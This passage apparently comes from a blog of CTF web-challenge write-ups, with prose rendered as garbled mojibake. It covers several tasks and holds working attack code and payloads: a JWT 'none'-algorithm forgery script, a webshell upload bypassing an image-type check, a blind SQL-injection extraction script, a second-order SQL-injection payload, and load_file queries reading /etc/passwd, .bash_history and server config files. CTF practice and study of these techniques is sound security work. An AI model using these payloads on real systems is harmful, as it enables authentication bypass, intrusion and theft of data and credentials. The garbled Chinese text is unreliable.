ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">'HS256'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            status        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string-property property">'GET /api/flag'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            flag        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string-property property">'GET /api/logout'</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">ctx<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">status</span><span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°åŠ å¯†ç®—æ³•æ˜¯HS256ï¼Œå°è¯•å°†å…¶æ›´æ”¹ä¸ºNoneç›´æ¥ä¼ å…¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwttoken <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token string">"secretid"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"aaaaa"</span><span class="token punctuation">,</span>  <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1649380156</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™»å½•æˆåŠŸï¼</p><p>è®¿é—®/api/flagæ‹¿åˆ°flag</p><h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>é˜´é—´é¢˜ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p><p>è¿›å»å°±ç–¯ç‹‚è·³è½¬ï¼Œæ€»ä¹‹å°±æ˜¯ä¸æ–­æŸ¥çœ‹æºç ä¸è¦è·³è½¬åˆ°dieï¼Œæœ€ç»ˆè·³è½¬åˆ°fightæŸ¥çœ‹js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Run to scramble original flag</span><span class="token comment">//console.log(scramble(flag, action));</span><span class="token keyword">function</span> <span class="token function">scramble</span><span class="token punctuation">(</span><span class="token parameter">flag<span class="token punctuation">,</span> key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> key<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">%</span> flag<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">let</span> temp <span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">check_action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> action <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"&#123;hey"</span><span class="token punctuation">,</span> <span class="token string">"_boy"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"s_im"</span><span class="token punctuation">,</span> <span class="token string">"ck!&#125;"</span><span class="token punctuation">,</span> <span class="token string">"_baa"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"pctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// TODO: unscramble function</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŒ‰ç…§äººé—´è¯­æ³•æ‹¼å‡ºflag</p><pre class="line-numbers language-none"><code class="language-none">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>çœ‹åˆ°è¿™ç§æ¨¡ç‰ˆåŒ–çš„ç•Œé¢ï¼Œå°è¯•æ‰«ç›®å½•çœ‹çœ‹æ˜¯ä¸æ˜¯ä»£ç å®¡è®¡ï¼Œç»“æœæ²¡æœ‰ï¼Œä¹–ä¹–æ³¨å†Œç™»å½•ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ å¤´åƒï¼Œç©ºæ–‡ä»¶ç›´æ¥ä¸Šä¼ å‘ç°è­¦å‘Š</p><pre class="line-numbers language-none"><code class="language-none">Warning: exif_imagetype(): Filename cannot be empty in &#x2F;var&#x2F;www&#x2F;html&#x2F;profile.php on line 76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>emmmmmmmï¼Œä½¿ç”¨exif_imagetypeå¯ä½¿ç”¨å¹»æ•°å¤´ç»•è¿‡ï¼Œä¸Šä¼ æœ¨é©¬</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-08">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-08</a> 22.05.39.png)</p><p>è®¿é—®æ‹¿flagå³å¯</p><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>å¸ƒå°”æ³¨å…¥å–µå–µï¼Œè„šæœ¬æ‡’å¾—è´´äº†å–µå–µ</p><pre class="line-numbers language-none"><code class="language-none">databaseï¼šgive_grandpa_pa_pa_pa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>information_schemaè¢«banäº†ï¼Œmysql.innodb_table_statsä¹Ÿè¢«banäº†ï¼Œæ–°æ–°çŸ¥è¯†å±…ç„¶è¿˜æœ‰ä¸ªèƒ½ç”¨çš„</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema&#x3D;database()table:f1ag_1s_h3r3_hhhhh,users2333333333333331^((select (&#39;~&#39;,&#39;~&#39;))&gt;(select * from f1ag_1s_h3r3_hhhhh))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æœ€åå°±æ˜¯æ— åˆ—åæ³¨å…¥å•¦</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsflagname<span class="token operator">=</span><span class="token string">"flag-&#123;1234567890bcdefg&#125;"</span>name<span class="token operator">=</span><span class="token string">",qwertyuioplkjhgfdsazxcvbnmQAZWSXEDCRFVTGBYHNUJMIKOLP1234567890"</span>url<span class="token operator">=</span><span class="token string">"http://4664ea16-9fe4-4020-bc20-7e556fa70991.node4.buuoj.cn:81/index.php"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"0^((select 1,'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">')>(select * from f1ag_1s_h3r3_hhhhh))"</span></span><span class="token punctuation">&#125;</span>        tes<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> tes<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><p>å…ˆçˆ†ç ´ç™»å½•ï¼Œzhangwei666</p><p>.gitæ–‡ä»¶æ³„éœ²</p><p>GitHackæ‰«å‡ºåå‘ç°ä»£ç å†…å®¹ä¸å…¨ï¼Œä½¿ç”¨Gitæ¢å¤æ—§ä»“åº“</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//write_do.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'write'</span><span class="token punctuation">:</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token string single-quoted-string">'comment'</span><span class="token punctuation">:</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾åœ¨commentå¤„å­˜åœ¨äºŒæ¬¡æ³¨å…¥ï¼Œåˆå› ä¸ºæ­¤å¤„insertæ˜¯å¸¦æœ‰æ¢è¡Œçš„ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ä½¿ç”¨#æ¥è¿›è¡Œæ³¨é‡Šï¼Œä½¿ç”¨/**/è¿›è¡Œå¤šè¡Œæ³¨é‡Šï¼Œæ„é€ payload</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">category:0&#39;,content&#x3D;database(),&#x2F;*ç•™è¨€commentå¤„:*&#x2F;#æœ€ç»ˆæ„é€ å‡ºçš„è¯­å¥insert into commentset category &#x3D; &#39;0&#39;,content&#x3D;database(),&#x2F;*&#39;,content &#x3D; &#39;*&#x2F;#&#39;,bo_id &#x3D; &#39;$bo_id&#39;&quot;;insert into comment set category &#x3D; &#39;0&#39;,content&#x3D;database(),bo_id &#x3D; &#39;$bo_id&#39;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨å›æ˜¾ç•™è¨€å³å¯çœ‹åˆ°ç»“æœ</p><p>![](<a href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-09">https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-05-09</a> 08.47.30.png)</p><p>æŒ‰ç…§è¿™ä¸ªæ–¹æ³•æŸ¥å®Œå…¨åº“ä¹Ÿæ²¡æœ‰ç»“æœï¼Œå°è¯•loadfileå§ï¼Œä¸çŸ¥é“è¯»å•¥ï¼Œæä¸€ä¸‹wpçš„ç»“æœ</p><blockquote><p>load_file(â€˜æ–‡ä»¶ç»å¯¹è·¯å¾„â€™)è¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚ä½¿ç”¨æ­¤å‡½æ•°ï¼Œè¯¥æ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œå¿…é¡»æœ‰FILEæƒé™ã€‚<br>ä¸€èˆ¬ç”¨æ³•æ­¥éª¤ï¼š<br>è¯»/etc/init.dä¸‹çš„ä¸œè¥¿ï¼Œè¿™é‡Œæœ‰é…ç½®æ–‡ä»¶è·¯å¾„<br>?id=1â€™ union select 1,2,load_file(â€˜/etc/init.d/httpdâ€™)<br>å¾—åˆ°webå®‰è£…è·¯å¾„<br>?id=1â€™ union select 1,2,load_file(â€˜/etc/apache/conf/httpd.confâ€™)<br>è¯»å–å¯†ç æ–‡ä»¶<br>?id=1â€™ union select 1,2,load_file(â€˜var/www/html/xxx.com/php/conn.inc.phpâ€™)</p></blockquote><p>å…ˆçœ‹/etc/passwd</p><pre class="line-numbers language-none"><code class="language-none">www:x:500:500:www:&#x2F;home&#x2F;www:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¾—åˆ°è·‘webæœåŠ¡çš„ç”¨æˆ·</p><blockquote><p>æ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ï¼Œä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ï¼Œæ–¹ä¾¿æŸ¥æ‰¾ã€‚</p></blockquote><p>è®¿é—®æ‹¿åˆ°ç”¨è¿‡çš„å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">cd &#x2F;tmp&#x2F; unzip html.zip rm -f html.zip cp -r html &#x2F;var&#x2F;www&#x2F; cd &#x2F;var&#x2F;www&#x2F;html&#x2F; rm -f .DS_Store service apache2 start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®/tmp/html/.DS_Storeæ‹¿åˆ°æ–‡ä»¶å¤¹å†…å®¹ï¼Œå¤ªé•¿å†…å®¹å¯èƒ½åŒ…å«sqlè¯­å¥ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–ç ï¼Œå‘ç°æ–‡ä»¶<code>flag_8946e1ff1ee3e40f.php</code>ï¼Œè¯»å–æ‹¿flagå³å¯ï¼Œè®°å¾—è¯»/var/www/htmlä¸‹çš„æ–‡ä»¶ï¼Œtmpä¸­çš„ä¸æ­£ç¡®</p><h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>cookiebase64è§£ä¸€ä¸‹ç„¶åæ”¹äº†ä»·æ ¼å†ä¼ å›å»</p><h2 id="ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown"><a href="#ç½‘é¼æ¯-2020-ç™½è™ç»„-PicDown" class="headerlink" title="[ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDown"></a>[ç½‘é¼æ¯ 2020 